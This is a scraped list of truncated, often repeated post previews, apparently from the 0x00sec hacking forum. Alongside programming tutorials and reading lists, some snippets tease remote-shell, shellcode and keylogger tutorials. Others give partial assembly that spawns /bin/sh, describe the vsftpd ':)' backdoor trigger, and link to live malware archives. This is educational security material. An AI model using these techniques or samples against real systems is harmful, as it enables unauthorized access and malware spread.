https://docs.oracle.com/cd/E19957-01/806-3568/n&hellip;", "I had learn a lot from those. What every programmer should know about memory, Part 1  (the rest of the parts are linked at the end of the article, just before the comments) What Every Computer Scientist Should Know About Floating-Point Arithmetic https://docs.oracle.com/cd/E19957-01/806-3568/n&hellip;", "I had learn a lot from those. What every programmer should know about memory, Part 1  (the rest of the parts are linked at the end of the article, just before the comments) What Every Computer Scientist Should Know About Floating-Point Arithmetic https://docs.oracle.com/cd/E19957-01/806-3568/n&hellip;", "I had learn a lot from those. What every programmer should know about memory, Part 1  (the rest of the parts are linked at the end of the article, just before the comments) What Every Computer Scientist Should Know About Floating-Point Arithmetic https://docs.oracle.com/cd/E19957-01/806-3568/n&hellip;", "Mandatory reading for C coders http://c-faq.com/", "Intel Programming Manuals http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html", "I haven\u2019t manage myself  In case somebody do not know what you are talking about, or wants to try: http://www.claymath.org/millennium-problems/p-vs-np-problem You would be contributing to mankind!", "@unh0lys0da: Your second code works OK on my system. The first one crashes\u2026 I haven\u2019t checked why . I like the xor rax,59 This is my version (@unh0lys0da a small variation of the one you\u2019ve already seen). section .textmsg db &#39;/bin/sh&#39;,0 global _start    _start:xor rax,raxmov rdx,rax &hellip;", "I haven\u2019t manage myself  In case somebody do not know what you are talking about, or wants to try: http://www.claymath.org/millennium-problems/p-vs-np-problem You would be contributing to mankind!", "I\u2019ll be writing up a Dijkstra\u2019s Algorithm tutorial, @Sea, but I\u2019ll wrap up this Linked List series first. Lol if I solve P = NP I\u2019d like my million-dollar check payed to the order of @oaktree.", "Alright I\u2019m a big fan of C. I will post some C programming tutorials and books I\u2019ve found here! Books:The C Programming Language - K &amp; RPros: Covers the entire syntaxIs a must-readThe best book about the C programming languageVery in-depth Cons:Might be a bit hard for beginners (then aga&hellip;", "Yeah\u2026 I know\u2026 my English is not the best", "Thanks everybody for the positive feedback!", "In Part I of this series we learn how to enable a very basic remote shell access to a machine. In this second part we are going to modify the code to support some level of manipulation of the data transmitted over the link. Specifically, we are going to encrypt the data stream\u2026 :o LEVEL: Beginner H&hellip;", "Intel Programming Manuals http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html", "Alright here some good links/books for ASM: Books:John Bartlett - Programming From the ground upNASMLinuxx86 (32 bit)AT&amp;T Syntax (Hate AT&amp;T personally). http://mirror.unicorncloud.org/savannah-nongnu//pgubook/ProgrammingGroundUp-1-0-booksize.pdfPaul Carter - PC Assembly LanguageNASMLin&hellip;", "It won\u2019t work for several reasons: There are nullbytes. (If you\u2019d use this to overflow nullterminated string input).It\u2019s /bin/sh/bin/sh also has to be null terminated (You need to push a null on the stack as well).Apart from that the code is right. I think the following should work: section &hellip;", "You did\u2026 in the original post in the website/blog we had at the beginning", "In a connected world, remotely accessing computers is happening all the time. You use services like ssh or telnet for that purpose but, sometimes, they are not available or it is not possible to even deploy those services in the target device. In those cases you can easily write your own remote shel&hellip;", "In Part I of this series we learn how to enable a very basic remote shell access to a machine. In this second part we are going to modify the code to support some level of manipulation of the data transmitted over the link. Specifically, we are going to encrypt the data stream\u2026 :o LEVEL: Beginner H&hellip;", "In a connected world, remotely accessing computers is happening all the time. You use services like ssh or telnet for that purpose but, sometimes, they are not available or it is not possible to even deploy those services in the target device. In those cases you can easily write your own remote shel&hellip;", "In Part I of this series we learn how to enable a very basic remote shell access to a machine. In this second part we are going to modify the code to support some level of manipulation of the data transmitted over the link. Specifically, we are going to encrypt the data stream\u2026 :o LEVEL: Beginner H&hellip;", "In Part I of this series we learn how to enable a very basic remote shell access to a machine. In this second part we are going to modify the code to support some level of manipulation of the data transmitted over the link. Specifically, we are going to encrypt the data stream\u2026 :o LEVEL: Beginner H&hellip;", "In a connected world, remotely accessing computers is happening all the time. You use services like ssh or telnet for that purpose but, sometimes, they are not available or it is not possible to even deploy those services in the target device. In those cases you can easily write your own remote shel&hellip;", "In Part I of this series we learn how to enable a very basic remote shell access to a machine. In this second part we are going to modify the code to support some level of manipulation of the data transmitted over the link. Specifically, we are going to encrypt the data stream\u2026 :o LEVEL: Beginner H&hellip;", "Love the subject! Great tutorial\u2026 Just 32bits but it really covers everything! Thanks for sharing", "Hello 0x00sec! Today, I\u2019ll be going over search(...), as promised. Basic Algorithm Descriptionsearch(...) will take one parameter q of type T, the value to look for in a linked list. The function returns a node&lt;T&gt;* (a pointer to a node in the list) if q is found; or nullptr if q is not found. Thi&hellip;", "Quality as always pico, keep it up", "OK! I think that depends on the specific system. Usually, and specially for the first stage boot code, you usually have just one option (the address the processor starts running code), for even more embedded system you probably will need an specialised Link Script", "In Part I of this series we learn how to enable a very basic remote shell access to a machine. In this second part we are going to modify the code to support some level of manipulation of the data transmitted over the link. Specifically, we are going to encrypt the data stream\u2026 :o LEVEL: Beginner H&hellip;", "Find the location of the inode(?) to start reading from", "In Part I of this series we learn how to enable a very basic remote shell access to a machine. In this second part we are going to modify the code to support some level of manipulation of the data transmitted over the link. Specifically, we are going to encrypt the data stream\u2026 :o LEVEL: Beginner H&hellip;", "In Part I of this series we learn how to enable a very basic remote shell access to a machine. In this second part we are going to modify the code to support some level of manipulation of the data transmitted over the link. Specifically, we are going to encrypt the data stream\u2026 :o LEVEL: Beginner H&hellip;", "Not sure what do you mean my find the location. Anyhow I never had a chance to use it. It is for really constrained embedded system\u2026", "In Part I of this series we learn how to enable a very basic remote shell access to a machine. In this second part we are going to modify the code to support some level of manipulation of the data transmitted over the link. Specifically, we are going to encrypt the data stream\u2026 :o LEVEL: Beginner H&hellip;", "In Part I of this series we learn how to enable a very basic remote shell access to a machine. In this second part we are going to modify the code to support some level of manipulation of the data transmitted over the link. Specifically, we are going to encrypt the data stream\u2026 :o LEVEL: Beginner H&hellip;", "Hey thanks for your comment. Thanks for mentioning that link. It\u2019s a common misstep for people. Few things: Execve and write are different syscalls and require different arguments. Assigning rdx twice seems like a typo. (Shouldnt the first RDX be RDI?). In 64 bit instead of using EAX, EBX, E&hellip;", "There are some unusual circumstances where that does not hold XIP eXecute In Place. But, this is not that common", "Love the subject! Great tutorial\u2026 Just 32bits but it really covers everything! Thanks for sharing", "In a connected world, remotely accessing computers is happening all the time. You use services like ssh or telnet for that purpose but, sometimes, they are not available or it is not possible to even deploy those services in the target device. In those cases you can easily write your own remote shel&hellip;", "As promised, here is the shellcode tutorial once again RequirementsAlright so this isn\u2019t going to be msfvenom tutorial. (shellcodes are payloads). This tutorial will focus on writing shellcodes using Assembly. Knowledge of C and Assembly is highly recommend. Also knowing how the stack works is a&hellip;", "Because there are so many assembly tutorials I will begin with giving you some important links. http://www.tutorialspoint.com/assembly_programming/index.htm This link really helped me learn Assembly. It\u2019s very informative and covers everything. My idea was that people follow this guide and ask q&hellip;", "In a connected world, remotely accessing computers is happening all the time. You use services like ssh or telnet for that purpose but, sometimes, they are not available or it is not possible to even deploy those services in the target device. In those cases you can easily write your own remote shel&hellip;", "In a connected world, remotely accessing computers is happening all the time. You use services like ssh or telnet for that purpose but, sometimes, they are not available or it is not possible to even deploy those services in the target device. In those cases you can easily write your own remote shel&hellip;", "Please note that I said something like a smart pointer. Just to be clear, what I said is that, for each new you have to run a delete. You can use some trick to fire the execution of delete but you have to call it. For automatic variables you do not have to, the compiler generates that code for you. &hellip;", "You will be amazed how much stuff that belongs to museums is still alive. Furthermore, most of the technology we are using nowadays (if not all of them) was defined, specified, described or envisioned more than 50 years ago\u2026 Just think about UNIX and C. They where developed end of the 60s beginning&hellip;", "On top of that, tons of algorithms were devised more than 50 years ago.", "In a connected world, remotely accessing computers is happening all the time. You use services like ssh or telnet for that purpose but, sometimes, they are not available or it is not possible to even deploy those services in the target device. In those cases you can easily write your own remote shel&hellip;", "Please note that I said something like a smart pointer. Just to be clear, what I said is that, for each new you have to run a delete. You can use some trick to fire the execution of delete but you have to call it. For automatic variables you do not have to, the compiler generates that code for you. &hellip;", "On top of that, tons of algorithms were devised more than 50 years ago.", "Thanks!. Beginners are the future", "Thanks!. Beginners are the future", "In a connected world, remotely accessing computers is happening all the time. You use services like ssh or telnet for that purpose but, sometimes, they are not available or it is not possible to even deploy those services in the target device. In those cases you can easily write your own remote shel&hellip;", "In a connected world, remotely accessing computers is happening all the time. You use services like ssh or telnet for that purpose but, sometimes, they are not available or it is not possible to even deploy those services in the target device. In those cases you can easily write your own remote shel&hellip;", "Could use some explanations. To be honest, I haven\u2019t read the code in full, but I saw that you didn\u2019t write any comments. As I understood it, your intention was to teach people Python by example, and a comment here and there would not hurt that cause. Furthermore,  \u201cunderstanding things by reading&hellip;", "You will be amazed how much stuff that belongs to museums is still alive. Furthermore, most of the technology we are using nowadays (if not all of them) was defined, specified, described or envisioned more than 50 years ago\u2026 Just think about UNIX and C. They where developed end of the 60s beginning&hellip;", ":)\u2026 that is what the sentences [quote=\u201c0x00pf, post:10, topic:236\u201d] \u2026it all depends on what you have to do\u2026 [/quote] and meant.", ":)\u2026 that is what the sentences [quote=\u201c0x00pf, post:10, topic:236\u201d] \u2026it all depends on what you have to do\u2026 [/quote] and meant.", "Please note that I said something like a smart pointer. Just to be clear, what I said is that, for each new you have to run a delete. You can use some trick to fire the execution of delete but you have to call it. For automatic variables you do not have to, the compiler generates that code for you. &hellip;", "Well said, @0x00pf\u2026 You can\u2019t pass a block to .sort() in Python? You can in Ruby, and it makes manipulating complex data types very simple. @dtm I agree with your point that we shouldn\u2019t maintain tech that belongs in a museum. But, if programming becomes particularly easy because of compiler optim&hellip;", "My thoughts\u2026 As  any single programming language feature out there, there is a situation or problem where they will help. Said that, I think generics are overall a great thing. From a SW development point of view they provide what every programming language aims to provide; a simplified way to wri&hellip;", "The destructors you\u2019ll see in the next post of this series (1.1) are implemented such that resource allocation is responsible without smart pointers. @0x00pf Believe me: If I knew there were memory leaks, I wouldn\u2019t post the code\u2026 And I did check with valgrind.", "Can\u2019t agree with this more. However, there tends to be a trade-off with high-level abstraction and speed/efficiency. Since a higher level language won\u2019t let you tinker under the hood, you have to use what you\u2019ve been given. Give for example pythons .sort() function. Now I don\u2019t know how this functi&hellip;", "My thoughts\u2026 As  any single programming language feature out there, there is a situation or problem where they will help. Said that, I think generics are overall a great thing. From a SW development point of view they provide what every programming language aims to provide; a simplified way to wri&hellip;", "My thoughts\u2026 As  any single programming language feature out there, there is a situation or problem where they will help. Said that, I think generics are overall a great thing. From a SW development point of view they provide what every programming language aims to provide; a simplified way to wri&hellip;", "C++ does it with automatic variables but not with dynamically allocated objects, static variables,\u2026 @dtm redefines types as pointers what suggested that everything will be dynamically allocated. In those cases you need to use something like a smart pointer. Smart pointers are nowadays part of C++, s&hellip;", "That is why I really left NB\u2026 that censorship.", "That is why I really left NB\u2026 that censorship.", "That is why I really left NB\u2026 that censorship.", "That\u2019s because this is not really a exploit. This is a backdoor. There is code in that specific version of vsftpd that checks if username contains the \u2018:)\u2019 string, and then, it fires the remote shell.", "Pico is right. You could just log in with a normal FTP client and type the credentials. Some hackers broke into vsftpd and updated the binary on the download page.  And thus lots of people updated and downloaded the hacked version of vsftpd.", "That\u2019s because this is not really a exploit. This is a backdoor. There is code in that specific version of vsftpd that checks if username contains the \u2018:)\u2019 string, and then, it fires the remote shell.", "Capture The Flag  Vulnerable Machine Part I - Metasploitable 2Hello Hackers and welcome to this post , in this post I will show you how you can take control of the VM Metasploitable 2. I will show you differents ways of taking control of this Vulnerable VM. In this first part I will cover the vsftp&hellip;", "That\u2019s because this is not really a exploit. This is a backdoor. There is code in that specific version of vsftpd that checks if username contains the \u2018:)\u2019 string, and then, it fires the remote shell.", "@oaktree: LOL. Love the \u201cDunno\u201d reply.", "Hey 0x00\u2019ers! I am happy to announce we have decent syntax highlight support!  To format your code just embody your code with three backticks. You can also put the language after the first line of backticks if it doesn\u2019t specifiy it. In future I will be adding x86 and other types of ASM. If you nee&hellip;", "@0x00pf: Like we\u2019ve often said, it\u2019s a new site, a work in progress. Some things might not last long; some may change. Nothing is written in stone, literally and metaphorically.", "So\u2026 there will be two different places with two different sets of posts? The pull request thing is not that hard, but posting in here is zero effort\u2026 I\u2019d expect that people will post here in the forums and then what is the point of the website\u2026 Am I missing something? P.S.: I\u2019m perfectly fine with&hellip;", "Great tutorial!. My 2 cents: Take a look to os.stat and friends and also to os.utime. Nice work!", "Hello, My name is WireWise, today I will show you how to how to write some anti-forensics code in Python 3. None of this code is low-level anti-forensics(rootkits) in the way there is no kernel or user land hooks(I\u2019m learning that and hopefully will post about it someday). Most of the code will be &hellip;", "Thanks pry0cc, I think you should decide on some kind of structure. I mean, will this repo only contain tutorials code, or may we expect some community development of special tools?.. or what if we organize a Hackaton as it was proposed at NB some time ago?.. I will wait, at least, for that discla&hellip;", "It\u2019s up to the contributor. I don\u2019t think Defalt likes posting to the site using the Github submission platform.", "Nice post! When will we see it added to the website?", "I briefly saw yesterday the message announcing the availability of a community code repository at github. https://github.com/0x00sec/Community-Code That is great, but I have a couple questions/comments: It would be nice if somebody provides a disclaimer template so, all of us use the same and we&hellip;", "Hello everyone! I\u2019ve recently discovered my personally favorite way to practice programming languages. Basically, we\u2019re going to find an exploit written in a different language, and we\u2019re going to rebuild it in the language we want to practice. In this article, we\u2019re going to be rebuilding an explo&hellip;", "Over the last few days 0x00sec has been blowing up, and people have been doing a cracking job at contributing and doing their bit in the community. Due to the awesome spirit of this community, we are steadily approaching our target of 100 users! We have a target to reach 100 users by the end of May&hellip;", "S\u2019goin\u2019 on guys, dtm here with a write-up on Windows keylogging. As a promotional gift, I will be detailing a type of keylogger on the code level written in MSVC++ utilising the WinAPI. Disclaimer: The following document is not newbie-friendly and requires a fair amount of knowledge of both genera&hellip;", "VXHeaven Contains older malware source code mostly designed to target systems such as DOS, Windows NT and Windows XP. Includes malware written in several languages such as ASM, C/C++, Perl, Python, Ruby. WARNING: LIVE MALWARE AHEAD!Github - MalDB - theZoo About:theZoo is a project created to m&hellip;", "Congratulations for the great start. Hope to be able to contribute some post in the near future Cheers pico", "Congratulations for the great start. Hope to be able to contribute some post in the near future Cheers pico"]}